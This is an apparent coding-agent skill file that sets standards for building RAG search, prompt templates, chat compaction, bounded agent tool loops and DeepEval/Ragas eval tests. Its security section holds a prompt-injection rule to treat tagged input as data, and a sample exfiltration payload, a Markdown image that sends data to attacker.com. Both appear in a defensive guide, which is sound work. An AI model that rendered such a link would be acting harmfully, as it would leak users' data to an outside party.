---
name: ai-standards
description: >-
  MANDATORY TRIGGER: Invoke BEFORE writing or modifying any LLM/AI integration, prompt templates, agent workflows, RAG pipelines, embeddings, tool calls, or model routing.
  Keywords & Triggers: RAG, retrieval augmented generation, hybrid search, BM25, dense vector search, pgvector, vector database, Pinecone, Chroma, Qdrant, embeddings, reranking, cross-encoder, Cohere rerank, BGE reranker, RRF, reciprocal rank fusion, contextual chunking, semantic chunking, prompt engineering, system prompts, prompt-master, XML delimiters, few-shot prompts, grounding anchors, chat systems, conversation history, sliding window compaction, streaming SSE, agent systems, tool calling, function calling, ReAct loop, LangGraph, Vercel AI SDK, evaluation, evals, RAG triad, faithfulness, groundedness, context precision, answer relevance, DeepEval, Ragas, golden dataset, LLM as a judge.
  File globs: **/{ai,rag,prompts,llm,embeddings,agents}/**
trigger: model_decision
---

# ai-standards: AI Platform, RAG, Agent & Evaluation Protocol

> **Scope**: Architecture and implementation standards for developers building AI-powered platforms — Retrieval-Augmented Generation (RAG), Conversational Chat Systems, Autonomous Agent Loops, Tool Calling, and Automated AI Evals.  
> **Normative Standards**: Aligned with the **RAG Triad (TruLens/Ragas)**, **OWASP Top 10 for LLMs (2025)**, **NIST AI RMF 1.0**, and production prompt engineering benchmarks.  
> **Core Principle**: Build robust, grounded, and verifiable AI platforms. Pair dense vector embeddings with sparse BM25 retrieval, rerank with cross-encoders, isolate untrusted data in XML delimiters, enforce strict schema contracts, bound autonomous loops with circuit breakers, and gate every deployment with automated eval tests (`assert_test()`).

---

## 🚨 Pre-Flight Gate (Read Before Coding)

Before writing or modifying any AI platform code, verify these 6 non-negotiable gates:

1. **Deterministic Code First**: Never invoke an LLM for operations that deterministic code (regex, math, SQL, permission checks, sorting, string manipulation) handles with 100% reliability.
2. **Hybrid Search + Neural Reranking for RAG**: Dense vector search alone fails on exact keywords, SKUs, error codes (`ERR-104`), and acronyms. Production RAG MUST combine sparse BM25 with dense vector embeddings via Reciprocal Rank Fusion (RRF), followed by a cross-encoder neural reranker (Cohere, BGE, or FlashRank) to compress candidate pools to the top 3–5 high-precision chunks.
3. **Strict Schema-Enforced Outputs (Zod/Pydantic)**: Never parse free-form model text with ad-hoc regex. All structured generation MUST use provider-level schema enforcement (`generateObject` / `response_format: json_schema`) and validate through Zod/Pydantic before business logic touches it.
4. **Grounded Prompts & XML Delimiter Boundaries**: Untrusted user inputs, external documents, and search results MUST be isolated inside tagged XML delimiters (`<user_input>`, `<document>`) with explicit system prompt boundary instructions. Critical constraints and grounding anchors must reside in the first 30% of the prompt (the Primacy Zone).
5. **Automated Evaluation Tests (The RAG Triad)**: Every RAG pipeline, agent tool, or prompt revision MUST have automated eval tests (using DeepEval or Ragas) validating:
   - **Context Precision / Recall**: Did retrieval surface the necessary and sufficient context? ($\ge 0.85$)
   - **Faithfulness / Groundedness**: Is the answer derived *only* from the retrieved context without hallucination? ($\ge 0.90$)
   - **Answer Relevance**: Does the output directly answer the question? ($\ge 0.90$)
6. **Silent Competence & Server-Side Isolation**: Keep prompts and model execution isolated to server-side code (actions, handlers, services). Never expose system prompts or raw internal reasoning traces to client bundles or user UI. Describe features by their human domain utility, never prompt-scaffolding buzzwords.

### Operational Modes:
- **Mode A: Greenfield / New AI Pipeline**: Run the Section 0 Architecture Interview below in a single friendly turn.
- **Mode B: Incremental Modification / Patch**: **DO NOT** run the interview questionnaire. Automatically inspect existing model clients, vector configs, and schemas. Enforce all 5 pre-flight gates directly.

---

## ⚡ Golden Patterns (DO vs. DON'T)

### 1. Hybrid Search (Dense Vector + BM25 + RRF) vs. Naive Vector Search
```ts
// ❌ [DON'T] Pure dense vector search — misses exact error codes, names, and product SKUs
const results = await vectorDb.similaritySearch(queryEmbedding, { limit: 5 });

// ✅ [DO] Dual-path Sparse BM25 + Dense Vectors combined via Reciprocal Rank Fusion (RRF)
export async function hybridRetrieve(query: string, queryEmbedding: number[], limit = 30) {
  const [denseResults, sparseResults] = await Promise.all([
    db.query(`SELECT id, content, 1 - (embedding <=> $1) AS score FROM documents ORDER BY embedding <=> $1 LIMIT $2`, [queryEmbedding, limit]),
    db.query(`SELECT id, content, ts_rank_cd(to_tsvector('english', content), plainto_tsquery('english', $1)) AS score FROM documents WHERE to_tsvector('english', content) @@ plainto_tsquery('english', $1) ORDER BY score DESC LIMIT $2`, [query, limit])
  ]);

  // Reciprocal Rank Fusion (k = 60)
  const rrfScores = new Map<string, { doc: any; score: number }>();
  const k = 60;

  denseResults.forEach((doc, rank) => {
    rrfScores.set(doc.id, { doc, score: 1 / (k + rank + 1) });
  });

  sparseResults.forEach((doc, rank) => {
    const existing = rrfScores.get(doc.id);
    const score = 1 / (k + rank + 1);
    if (existing) existing.score += score;
    else rrfScores.set(doc.id, { doc, score });
  });

  return Array.from(rrfScores.values())
    .sort((a, b) => b.score - a.score)
    .slice(0, limit)
    .map(entry => entry.doc);
}
```

### 2. Cross-Encoder Reranking vs. Dumping 30 Chunks to Context
```ts
// ❌ [DON'T] Stuffing 30 unranked search hits directly into LLM context (causes hallucination & token waste)
const context = retrievedChunks.map(c => c.content).join('\n\n');

// ✅ [DO] Rerank candidate pool with a cross-encoder model down to top 5 high-precision snippets
import { CohereClient } from 'cohere-ai';

const cohere = new CohereClient({ token: process.env.COHERE_API_KEY });

export async function rerankChunks(query: string, candidateChunks: Array<{ id: string; content: string }>, topN = 5) {
  const reranked = await cohere.v2.rerank({
    model: 'rerank-v3.5',
    query,
    documents: candidateChunks.map(c => c.content),
    topN,
  });

  return reranked.results.map(r => candidateChunks[r.index]);
}
```

### 3. Production Prompt Engineering (Prompt-Master XML Anatomy)
```markdown
<!-- ❌ [DON'T] Vague, unanchored prompt with string interpolation -->
You are a helpful assistant. Answer this query based on the docs: ${docs}. Query: ${userQuery}.

<!-- ✅ [DO] Structured XML sections, Primacy Zone constraints, and Grounding Anchor -->
<role>
You are an authoritative technical support engineer. Your sole job is to provide accurate, verified solutions.
</role>

<grounding_rules>
CRITICAL: Answer ONLY using facts directly stated in <retrieved_context>.
If the context does not contain the answer, reply: "I do not have enough verified documentation to answer this question."
NEVER speculate, extrapolate, or use outside knowledge.
</grounding_rules>

<retrieved_context>
<document id="doc_101" title="OAuth PKCE Guide">
PKCE is mandatory for single-page applications using authorization code grant...
</document>
</retrieved_context>

<user_query>
How do I configure PKCE for an SPA?
</user_query>

<output_format>
- Concise direct answer (1-3 sentences)
- Exact steps or code snippet
- Cite source as: [Doc Title](doc_id)
</output_format>
```

### 4. Automated Eval Tests (DeepEval / Ragas Unit Testing)
```ts
// ✅ [DO] Automated CI/CD unit test asserting Faithfulness and Context Relevance
import { describe, it, expect } from 'vitest';
import { LLMTestCase, assertTest, FaithfulnessMetric, ContextualRelevancyMetric } from 'deepeval';

describe('RAG Pipeline Regression Suite', () => {
  it('verifies answer is 100% faithful to retrieved documentation without hallucination', async () => {
    const query = 'How do I resolve ERR-104?';
    const { answer, retrievedDocs } = await runProductionRAG(query);

    const testCase = new LLMTestCase({
      input: query,
      actualOutput: answer,
      retrievalContext: retrievedDocs.map(d => d.content),
    });

    const faithfulness = new FaithfulnessMetric({ threshold: 0.85 });
    const contextRelevancy = new ContextualRelevancyMetric({ threshold: 0.80 });

    const result = await assertTest(testCase, [faithfulness, contextRelevancy]);
    expect(result.success).toBe(true);
  });
});
```

### 5. Agent Tool Calling with Schema & Circuit Breaker
```ts
// ❌ [DON'T] Unbounded while(true) loop executing model outputs without bounds
while (true) {
  const response = await model.chat(messages);
  if (!response.toolCalls) break;
  for (const call of response.toolCalls) execute(call); // Can run forever and drain budget!
}

// ✅ [DO] Strict Zod tool definitions, independent authorization, and a deterministic circuit breaker
export async function runAgentLoop(userPrompt: string, session: UserSession, maxIterations = 5) {
  let iterations = 0;
  const messages: ChatMessage[] = [{ role: 'user', content: userPrompt }];

  while (iterations < maxIterations) {
    iterations++;
    const response = await aiSdk.generateText({
      model: provider('gpt-4o'),
      messages,
      tools: registeredTools,
    });

    if (!response.toolCalls || response.toolCalls.length === 0) {
      return response.text; // Agent converged
    }

    for (const toolCall of response.toolCalls) {
      // Independent deterministic security gate
      await verifyToolPermission(toolCall.toolName, session);
      const output = await executeTool(toolCall.toolName, toolCall.args);
      messages.push({ role: 'tool', toolCallId: toolCall.id, content: JSON.stringify(output) });
    }
  }

  throw new Error(`Agent circuit breaker tripped: exceeded ${maxIterations} iterations without converging.`);
}
```

---

## 🔍 Anti-Amnesia Receipt

Whenever applying `ai-standards`, the coding agent **MUST** output a 1-line verification receipt at the top of its plan and output:

`🧠 [DevMind: ai-standards applied | Checked: <top 3 rules verified>]`

*Example:* `🧠 [DevMind: ai-standards applied | Checked: Hybrid BM25+Vector retrieval, cross-encoder reranker added, DeepEval faithfulness assertion configured]`

---

## 0 - Before You Write: Architecture Interview

### AI Platform Alignment Checklist

| # | Topic | ASK | Recommended Default |
|---|-------|-----|---------------------|
| 1 | **System Archetype** | RAG search pipeline, Conversational Chatbot, or Autonomous Agent with tool calling? | Hybrid RAG with schema-enforced output |
| 2 | **Retrieval Pipeline** | Pure vector, or Hybrid (BM25 + Dense Vector + Neural Reranker)? | Hybrid (Postgres pgvector/fulltext or Qdrant + BM25 + Cohere rerank) |
| 3 | **Chunking Strategy** | Semantic, Contextual Retrieval (Anthropic), or Parent-Child (Small-to-Big)? | Parent-Child: 200-token child chunks for search, 1000-token parent sent to LLM |
| 4 | **Model & Prompting** | Target model (Claude, GPT, Gemini, DeepSeek, Ollama) and prompt structure? | Claude Sonnet / GPT-4o with XML structure and Primacy Zone anchors |
| 5 | **History & Compaction** | Raw array, sliding window ($K$ turns), or recursive summary compaction? | Sliding window (last 6-8 turns) + `<conversation_summary>` block |
| 6 | **Agent Guardrails** | Max iterations, deterministic tool authorization, rate caps, human sign-off? | Max 5 iterations, independent permission check, human approval for writes |
| 7 | **Evals & Quality Gates** | Evaluation framework (DeepEval, Ragas) and test dataset? | DeepEval with RAG Triad unit tests (`FaithfulnessMetric` $\ge 0.85$) |

Echo back an **AI Architecture Summary** before writing implementation files.

---

## 1 - RAG & Search Architecture (Retrieval Engineering)

80% of RAG hallucinations stem from retrieval failures: the necessary context was either missing from the top results or drowned in irrelevant chunks.

### 1.1 The Multi-Stage Retrieval Pipeline

```
User Query
   │
   ├───► 1. Sparse Retrieval (BM25 / Full-Text) ───► Top 50 Candidates ──┐
   │                                                                     ├──► 3. Rank Fusion (RRF, k=60) ──► Top 30 Pool
   └───► 2. Dense Vector Retrieval (Embeddings) ──► Top 50 Candidates ──┘          │
                                                                                   ▼
                                                                           4. Cross-Encoder Reranker (Cohere / BGE)
                                                                                   │
                                                                                   ▼
                                                                           Top 3–5 High-Precision Snippets
                                                                                   │
                                                                                   ▼
                                                                           LLM Generator with Grounding Anchor
```

### 1.2 Chunking Strategies: Avoid Naive Token Slicing

1. **Parent-Child (Small-to-Big) Retrieval (Recommended)**:
   - Index small child chunks (150–250 tokens) with dense embeddings for high-precision retrieval matches.
   - When a child chunk matches, fetch and send the larger parent document or section (800–1200 tokens) to the LLM to give full context.
2. **Contextual Retrieval (Anthropic Pattern)**:
   - When chunking a document, prepend a 50–100 token explanatory header to each chunk:
     `Document Title: [Title] | Section: [Section] | Summary of document: [1-2 sentences]`
   - This eliminates orphan chunks where context is lost (e.g. a table row that lacks column headers or company names).
3. **Preserve Provenance Metadata**:
   Every stored chunk MUST include:
   ```ts
   interface ChunkMetadata {
     chunkId: string;
     documentId: string;
     sourceUrl: string;
     title: string;
     section: string;
     tenantId: string;       // Mandatory for multi-tenant isolation
     allowedRoles: string[]; // Mandatory for object permissions
     updatedAt: string;
   }
   ```

### 1.3 Pre-Retrieval Filtering (Tenant & Permission Security)
- Enforce tenancy and role permissions at the database level:
  `WHERE tenant_id = :tenantId AND :userRole = ANY(allowed_roles)`
- **NEVER** retrieve unauthorized chunks and ask the LLM to *"filter out what the user cannot see"*.

---

## 2 - Production Prompt Engineering (Prompt-Master Principles)

Consult `/prompt-master` techniques. High-quality prompts are engineered, structured, and token-efficient.

### 2.1 The Primacy Zone & XML Structure
Place the most critical behavioral constraints and grounding anchors in the **first 30%** of the prompt (the Primacy Zone) so they survive attention decay over long contexts.

Structure production prompts using explicit XML blocks:
- `<role>`: Specific domain expert identity (e.g., "Senior Cloud Security Architect").
- `<task>`: Concrete operation (convert vague verbs to exact actions).
- `<context>`: Domain information, project state, API versions.
- `<constraints>`: Grounding rules, negative boundaries, what NEVER to do.
- `<output_format>`: Exact shape, length, schema, and citation requirements.

### 2.2 Grounding Anchors (Hallucination Killers)
Always include an explicit grounding anchor on informational and factual tasks:
```markdown
<grounding_anchor>
Base your response ONLY on the facts present in <retrieved_context>.
If the context does not provide sufficient evidence to answer with certainty, output:
"The provided documentation does not contain enough verified information to answer this question."
Do not fabricate citations, extrapolate, or draw from external knowledge.
</grounding_anchor>
```

### 2.3 Model-Specific Prompt Optimization
- **Reasoning Models (o3, DeepSeek-R1, Qwen3 thinking)**:
  - Keep system prompts short (< 200 words).
  - State the goal and output format cleanly.
  - **NEVER** instruct the model to "think step by step" or add Chain-of-Thought scaffolding; these models reason natively across thousands of hidden tokens, and prompt scaffolding actively degrades their output.
- **Instruction-Tuned Models (Claude 3.5/Sonnet, GPT-4o, Gemini 2.x)**:
  - Respond best to explicit XML tags, role context, and few-shot calibration.
  - Use 2–3 diverse input/output examples to lock formatting.

---

## 3 - Chat Systems & Multi-Turn Conversations

### 3.1 Bounded Context Management
Unbounded arrays of messages (`messages: [...history]`) cause quadratic cost growth and sudden context limit crashes.

- **Sliding Window**: Retain system prompt + last 6–10 turns.
- **Recursive Summarization**: When history exceeds a threshold (e.g. 4,000 tokens), call a fast model (e.g. `gpt-4o-mini`, `claude-3-5-haiku`) to compress older turns into a single `<conversation_summary>` block:
  ```markdown
  <conversation_summary>
  User is building an OAuth 2.0 PKCE auth service in Node.js. Database is PostgreSQL.
  User previously confirmed they want to use Argon2id for password hashing.
  </conversation_summary>
  ```
- **Prompt Caching**: Keep static system instructions and tool schemas at the prompt prefix so providers (Anthropic, OpenAI, Gemini) cache tokens, slashing latency and cutting input costs by 80–90%.

### 3.2 Streaming & Provenance
- Use Server-Sent Events (SSE) for chat responses.
- Always attach an `AbortController` to cancel generation when the client disconnects, preventing wasted GPU compute.
- Emit citation tags (`[1]`, `[Doc Title](url)`) mapped directly to retrieved chunk IDs.

### 3.3 Silent Competence & Clean Product Integration
- **Server Isolation**: Prompts and AI orchestration belong exclusively in backend handlers or server actions. Never inline system prompts, keys, or templates in client-side components.
- **Humble Product Language**: Model outputs must be formatted as clean product data (JSON, markdown content), not conversational assistant filler ("Here is the requested analysis...").
- **No Raw Trace Spilling**: Chain-of-thought, thinking tokens, and intermediate prompt scaffolding must not leak into client-facing UI unless building a deliberate, developer-only debug drawer.

---

## 4 - Agent Systems & Tool Calling Platforms

### 4.1 Strict Schema Definitions
Every tool exposed to an agent must have an unambiguous name, clear description, and typed parameters with property descriptions:

```ts
import { z } from 'zod';

export const SearchUsersToolSchema = z.object({
  query: z.string().describe('Search string: name, email, or user ID'),
  department: z.enum(['engineering', 'sales', 'support', 'finance']).optional().describe('Filter by department'),
  limit: z.number().int().min(1).max(50).default(10).describe('Max records to return'),
});
```

### 4.2 Independent Tool Authorization Gates
Never execute a tool call based solely on the LLM's decision:
1. Parse arguments through the Zod schema.
2. Verify user session permissions deterministically in application code (`session.can('user:search')`).
3. If the tool mutates state (refunds, deletes, database writes), require a human confirmation step or an idempotency key.

### 4.3 Cycle Detection & Circuit Breakers
- Enforce `max_iterations = 5` (or 10 for complex multi-step pipelines).
- Track tool call hashes: if the agent generates the exact same tool name and arguments twice in a row, break the cycle and return an error to prompt re-planning.

---

## 5 - Automated AI Evaluation (Evals) & Quality Gates

Do not ship changes to prompts, chunking algorithms, models, or retrieval without runnable eval checks.

### 5.1 The RAG Triad Metrics
1. **Context Precision / Relevance**:
   $$\text{Precision} = \frac{|\text{Relevant Chunks in Retrieved Set}|}{|\text{Total Retrieved Chunks}|}$$
2. **Faithfulness / Groundedness**:
   $$\text{Faithfulness} = \frac{|\text{Claims in Answer supported by Context}|}{|\text{Total Claims in Answer}|}$$
3. **Answer Relevance**:
   Measures semantic alignment between the question and the generated answer, penalizing incomplete or evasive replies.

### 5.2 DeepEval / Ragas Test Pipeline Pattern
Create an automated test in `tests/ai/rag.eval.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { LLMTestCase, assertTest, FaithfulnessMetric, ContextualPrecisionMetric } from 'deepeval';
import goldenDataset from './fixtures/golden-dataset.json';

describe('Production AI Evaluation Suite', () => {
  for (const item of goldenDataset) {
    it(`evaluates test case: "${item.input.slice(0, 30)}..."`, async () => {
      const { output, context } = await runPipeline(item.input);

      const testCase = new LLMTestCase({
        input: item.input,
        actualOutput: output,
        expectedOutput: item.expectedOutput,
        retrievalContext: context,
      });

      const faithfulness = new FaithfulnessMetric({ threshold: 0.90 });
      const precision = new ContextualPrecisionMetric({ threshold: 0.85 });

      const evaluation = await assertTest(testCase, [faithfulness, precision]);
      expect(evaluation.success).toBe(true);
    });
  }
});
```

Gate CI/CD pull requests on eval scores: any prompt or chunking tweak that drops Faithfulness below 0.90 fails the build.

---

## 6 - Guardrails, Security & Token Economics

- **Prompt Injection Defense**: Wrap untrusted inputs in XML delimiters. Tell the model to treat content inside tags strictly as data, never instructions.
- **Data Exfiltration Defense**: Disallow models from rendering user-controlled Markdown images (`![leak](https://attacker.com/data=...)`) or unverified URLs.
- **Budget Caps**: Always set an explicit `max_tokens` cap on every completion. Monitor total session tokens to prevent denial-of-wallet attacks.

---

## ✅ Post-Implementation Checklist

- [ ] **Anti-Amnesia Receipt**: Printed `🧠 [DevMind: ai-standards applied | Checked: ...]` at the top of the plan.
- [ ] **Deterministic Code First**: Validated that math, authorization, and business rules remain in deterministic code.
- [ ] **Hybrid Retrieval**: Implemented sparse BM25 + dense vector embeddings combined via Reciprocal Rank Fusion (RRF).
- [ ] **Neural Reranking**: Applied cross-encoder reranker (Cohere/BGE) to compress candidate pool to top 3–5 chunks.
- [ ] **Chunking & Provenance**: Preserved document IDs, titles, source URLs, and tenant metadata on all chunks.
- [ ] **Pre-Retrieval Security**: Enforced tenant and role permissions at the database query layer.
- [ ] **Prompt Engineering**: Structured prompt with `<role>`, `<context>`, `<task>`, and `<output_format>`; grounding anchor in the Primacy Zone.
- [ ] **Structured Outputs**: Validated model outputs using provider-level JSON schema enforcement and Zod schemas.
- [ ] **Conversation Compaction**: Enforced sliding window and context summarization for chat histories; prompt caching applied.
- [ ] **Agent Safety**: Configured strict tool schemas, independent permission verification, and loop circuit breaker (`max_iterations`).
- [ ] **Eval Suite**: Configured automated unit tests using DeepEval or Ragas measuring the RAG Triad (Faithfulness $\ge 0.90$, Context Precision $\ge 0.85$).
- [ ] **Token Budgets**: Configured per-call `max_tokens` and cumulative session token tracking.

